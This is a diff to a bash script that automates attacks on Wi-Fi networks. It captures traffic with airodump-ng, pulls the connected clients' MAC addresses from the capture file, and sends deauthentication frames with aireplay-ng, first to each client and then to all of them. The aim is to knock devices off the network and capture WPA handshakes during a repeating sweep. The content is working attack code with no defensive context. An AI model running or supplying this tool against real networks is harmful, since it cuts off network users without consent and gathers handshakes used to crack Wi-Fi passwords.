@@ -56,11 +56,26 @@ while true; do
         CH=$(echo $target | cut -d',' -f4 | tr -d ' ')
         SESSION_CAP="$OUTPUT_DIR/$ESSID"
 
-        echo -e "Current Target: $ESSID with BSSID $BSSID on channel $CH"
-        sudo timeout 30s airodump-ng --bssid "$BSSID" --channel "$CH"  -w "$SESSION_CAP" "$INTERFACE" > /dev/null 2>&1 < /dev/null &
+        echo -en "Targeting: $ESSID with BSSID $BSSID (ch $CH).  "
+        sudo timeout 10s airodump-ng --bssid "$BSSID" --channel "$CH"  -w "$SESSION_CAP" "$INTERFACE" > /dev/null 2>&1 < /dev/null 
+        TARGET_CSV=$(ls -t "$OUTPUT_DIR/"*[0-9].csv | head -n 1)
+        STATIONS=($(awk -F, '/Station MAC/{flag=1; next} flag && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {print $1}' "$TARGET_CSV" | tr -d ' '))
+        echo -en "Found ${#STATIONS[@]} clients.  "
+
+        sudo timeout 45s airodump-ng --bssid "$BSSID" --channel "$CH"  -w "$SESSION_CAP" "$INTERFACE" > /dev/null 2>&1 < /dev/null &
         MONITOR_PID=$!
         sleep 5s # Let it settle
-        sudo aireplay-ng -D -0 2 -a "$BSSID" -c "50:84:92:06:B2:FC" "$INTERFACE" #   > /dev/null 2>&1
+        # Loop through and print them
+        if [ ${#STATIONS[@]} -eq 0 ]; then
+            sudo timeout -k 10s 12s aireplay-ng  -0 10 -D -a "$BSSID"  "$INTERFACE"   > /dev/null 2>&1
+        else
+            for CLIENT_MAC in "${STATIONS[@]}"; do
+                sudo timeout -k 3s 5s aireplay-ng  -0 3 -D -a "$BSSID" -c "$CLIENT_MAC" "$INTERFACE"     > /dev/null 2>&1
+                sleep 1s
+            done
+        fi
+        sleep 10s
+        sudo timeout -k 8s 10s aireplay-ng  -0 4 -D -a "$BSSID"  "$INTERFACE"    > /dev/null 2>&1
         wait $MONITOR_PID
 
         # 3. THE VALIDATION CHECK
@@ -75,6 +90,7 @@ while true; do
         else
             echo -e "${WHITE} No handshake${YELLOW}"
         fi
+        rm -f "$TEST_HASH"
     done
     echo -en $GREEN 
     echo "Finished one full sweep. Restarting scan..."
